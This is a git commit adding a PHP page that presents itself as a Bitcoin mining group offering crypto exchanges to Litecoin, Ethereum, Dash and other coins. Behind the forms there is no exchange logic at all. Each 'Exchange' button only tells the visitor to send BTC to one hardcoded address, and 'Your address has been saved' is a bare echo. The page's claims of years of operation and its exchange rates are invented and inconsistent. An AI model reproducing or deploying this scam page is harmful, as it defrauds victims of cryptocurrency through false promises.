b0e7b0f6f39e776768172515fe43ffb45f1fc394
medyaMM <117260233+medyaMM@users.noreply.github.com>
2022-11-16 14:00:57 +0300

    Add files via upload

---
+++ BMB.php
@@ -0,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="zaxo.css">
+<title>Btcoin</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<link rel="stylesheet" href="MBM.css">
+<style>
+</style>
+</head>
+
+<body>
+<div class="main">
+<div class="container-fluid ">
+<img style=" width: 111px;height: 69px;  " class="btc"  src="wena/f.png"  width="60">
+<h4 style="color:#fff">Operating since 2016</h4>
+
+<img src=" https://cryptologos.cc/logos/dogecoin-doge-logo.png?v=023 " width="40"> <img src=" https://cryptologos.cc/logos/aion-aion-logo.png?v=023 " width="40"> <img style="margin-right:3px ;" src=" https://cryptologos.cc/logos/tether-usdt-logo.png?v=023 " width="40"> <img src=" https://cryptologos.cc/logos/aelf-elf-logo.png?v=023 " width="40"> <img src=" https://cryptologos.cc/logos/lisk-lsk-logo.png?v=023 " width="40"> <img src=" https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023 " width="40"> <img src=" https://cryptologos.cc/logos/dash-dash-logo.png?v=023 " width="40"> <img style="margin-left: 3px;" src=" https://cryptologos.cc/logos/litecoin-ltc-logo.png?v=023 " width="40">
+<h5 style="color:#fff">(Will be added BNB soon)</h5>
+</div>
+
+<div class="navbar">
+<div class="icon">
+</div>
+<div class="content">
+  
+<h2  style="font-size:41px ;">Group of  <br><span> Bitcoin  </span>mining </h2>
+<p class="par">
+We mining’s Bitcoin for more than ten years and be profitable. <br>
+We buy these currencies in our own way at the lowest price in some platforms <br>
+that you cannot buy in these platforms with less than 2 Bitcoin.
+</p>
+<p class="parr">
+ <h4>The <spa> Conditions: </spa></h4>
+<ul>
+<li style="  
+  padding-left: 20px !important;
+  padding-bottom: 25px !important;
+  font-family: Arial !important;
+  letter-spacing: 1.2px !important;
+  line-height: 1px !important;
+  color:white !important;          ">You are allowed to exchange only once daily.</li>
+<li style="  
+  padding-left: 20px !important;
+  padding-bottom: 25px !important;
+  font-family: Arial !important;
+  letter-spacing: 1.2px !important;
+  line-height: 1px !important;
+  color:white !important;  ">Lowest exchange Bitcoin to (ETH,LTC,XDG,DASH,PIRL,ADX,AION,USDT,ELF,LSK) is 0.025 Bitcoin.</li>
+<li style="  
+  padding-left: 20px !important;
+  padding-bottom: 25px !important;
+  font-family: Arial !important;
+  letter-spacing: 1.2px !important;
+  line-height: 1px !important;
+  color:white !important; "> exchange Bitcoin to (ETH,LTC,XDG,DASH,PIRL,ADX,AION,USDT,ELF,LSK) is 0.40 Bitcoin.</li>
+<li style=" 
+  padding-left: 20px !important;
+  padding-bottom: 25px !important;
+  font-family: Arial !important;
+  letter-spacing: 1.2px !important;
+  line-height: 1px !important;
+  color:white !important; "> the highest exchange value is 1 Bitcoin daily, why ? To give everyone a chance to exchange.</li>
+</ul>
+
+</p>
+<br> 
+<form class="form"  method="POST">
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px ; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom: 8px;" src= " wena/b.png " >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px">To Litecoin <img style="margin-bottom:8px;  "  src="https://cryptologos.cc/logos/litecoin-ltc-logo.png?v=023    " ></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.02500000 BTC = 14,1476 LTC (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.05000000 BTC = 25,0946 LTC (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 46,9473 LTC (Fee 4%)</span>
+</label>
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC=103,3801 LTC (Fee 4%)</span>
+</label>
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC=187,6769 LTC (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="ho" class="btnn">Confirmation</button>
+<button name="go" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('ho',$_POST)){
+  butto();
+}
+
+function butto(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('go',$_POST)){
+  button();
+}
+
+function button(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+<br>
+<h1 style=" margin-right:44px; ">Soon (BNB <img style="margin-bottom: 8px; " src="wena/pngwing.com.png">)</h1>
+
+<form  style="margin-right: 780px;margin-left: 2px;margin-top:-30px;height: 566px;" class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px; padding:20px;" >Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px; " src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px">To Dogecoin <img   style="margin-bottom:8px;  "  src=" https://cryptologos.cc/logos/dogecoin-doge-logo.png?v=023  " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.00000000 BTC = 0,00000000 XDG (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.00000000 BTC = 0,00000000 XDG (Fee 4%)</span>
+</label>
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.00000000 BTC = 0,00000000 XDG (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="mo" class="btnn">Confirmation</button>
+<button name="co" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('mo',$_POST)){
+  bu();
+}
+
+function bu(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('co',$_POST)){
+  b();
+}
+
+function b(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+<br><br><br><br><br>
+
+
+<form  style="margin-right: 780px;margin-left: 2px;margin-top:-18\px;"  class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px ; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px; " src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px">To Ethereum <img   style="margin-bottom:8px; "  src=" https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023 " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>1.05000000 BTC = 1,27942086 ETH (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 1,88884169 ETH (Fee 4%)</span>
+</label>
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC = 2,49768339 ETH (Fee 4%)</span>
+</label>
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC = 6,81536679 ETH (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="lo" class="btnn">Confirmation</button>
+<button name="no" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('lo',$_POST)){
+  vb();
+}
+
+function vb(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('no',$_POST)){
+  bv();
+}
+
+function bv(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+<br><br><br><br>
+<br>
+<form style="margin-right: 780px;margin-left: 2px;margin-top:-25px;"  class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px ; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px;" src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px"> To Dash <img   style="margin-bottom:8px; "  src=" https://cryptologos.cc/logos/dash-dash-logo.png?v=023 " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.05000000 BTC = 26,2941 Dash (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 52,5568 Dash (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC = 68,6906 Dash (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC=209,7472 Dash (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="jj" class="btnn">Confirmation</button>
+<button name="nn" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('jj',$_POST)){
+u();
+}
+
+function u(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('nn',$_POST)){
+  q();
+}
+
+function q(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+
+<br><br><br><br>
+<br>
+<form style="margin-right: 780px;margin-left: 2px;margin-top:-25px;"  class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size: 30px; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px; " src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px"> To Lsk <img   style="margin-bottom:8px; "  src=" https://cryptologos.cc/logos/lisk-lsk-logo.png?v=023 " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.05000000 BTC = 2615 Lsk (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 5230 Lsk (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC=10460 Lsk (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC=20920 Lsk (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="oo" class="btnn">Confirmation</button>
+<button name="xx" class="btnn1">Exchange</button>
+
+</div>
+<br>
+  <?Php
+
+if (array_key_exists('oo',$_POST)){
+  o();
+}
+
+function o(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('xx',$_POST)){
+  x();
+}
+
+function x(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+<br><br><br><br>
+<br>
+<form style="margin-right: 780px;margin-left: 2px;margin-top:-25px;" class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px ; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px; " src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px"> To USDT <img   style="margin-bottom:8px; "  src=" https://cryptologos.cc/logos/tether-usdt-logo.png?v=023   " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 3100 USDT (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC = 6190 USDT (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC=12600  USDT (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="pp" class="btnn">Confirmation</button>
+<button name="zz" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('pp',$_POST)){
+s();
+}
+
+function s(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('zz',$_POST)){
+  z();
+}
+
+function z(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+
+<br><br><br><br><br>
+<br>
+<form style="margin-right: 780px;margin-left: 2px;margin-top:-24px;"    class="form"  method="POST">
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size: 30px; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style="margin-bottom:8px; " src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px"> To Aelf  <img   style="margin-bottom:8px;  "  src="  https://cryptologos.cc/logos/aelf-elf-logo.png?v=023  " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.05000000 BTC = 12499 ELF (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 20393 ELF (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC = 25656 ELF (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC = 78805  ELF (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="ppp" class="btnn">Confirmation</button>
+<button name="zzz" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('ppp',$_POST)){
+ss();
+}
+
+function ss(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('zzz',$_POST)){
+zz();
+}
+
+function zz(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+
+
+<br><br><br><br>
+<br>
+<form style="margin-right: 780px;margin-left: 2px;margin-top:-25px;"  class="form"  method="POST">
+
+<div class="medya">
+<div class="intro">
+<div class="jk">
+<h1 style="font-size:30px ; padding:20px;">Conversion <span style="color: #fff; font-size:30px; margin-bottom:-8px;">Bitcoin</span> <img style=" margin-bottom:8px;" src= " https://cryptologos.cc/logos/bitcoin-btc-logo.png"  >  </h1>
+<h3 style="margin-top: -30px; margin-left:-12px; font-size:28px"> To Aion <img   style="margin-bottom:8px; "  src=" https://cryptologos.cc/logos/aion-aion-logo.png?v=023  " width="40"></h3>
+</div>
+<h5 style=" margin-left:-25px; font-size:25px; margin-bottom:19px; color:#fff;">choose:</h5>
+
+<div class="form-box">
+
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.05000000 BTC = 51845 Aion (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.10000000 BTC = 88309 Aion (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.20000000 BTC=111095  Aion (Fee 4%)</span>
+</label>
+
+<label>
+<input type="radio" name="kk">
+<div class="circle" ></div>
+<span>0.40000000 BTC=340378  Aion (Fee 4%)</span>
+</label>
+
+
+
+
+</div>
+</div>
+<br>
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter the LTC address that receive the funds  </span>
+</div>
+        
+
+<div class="inputBox">
+<input type="text" require="required">
+<span> Enter your wallet address (BTC) </span>
+</div>
+
+<div  class="buttons">
+<button  name="pppp" class="btnn">Confirmation</button>
+<button name="zzzz" class="btnn1">Exchange</button>
+
+</div>
+<br>
+<?Php
+
+if (array_key_exists('pppp',$_POST)){
+sss();
+}
+
+function sss(){
+echo "<h5>Your address has been saved</h5>";
+
+}
+?>
+<br><br>
+
+<?php
+if (array_key_exists('zzzz',$_POST)){
+  zzz();
+}
+
+function zzz(){
+echo "<h5>10 min... send BTC to: 1A59JLzzctgSoKeBmA7oNQXTCXUfUbnDXq</h5>";
+
+}
+?>
+</form>
+
+
+
+
+
+
+
+
+
+</div>
+</div>
+</div>
+</body>
+</html>
+
+
+
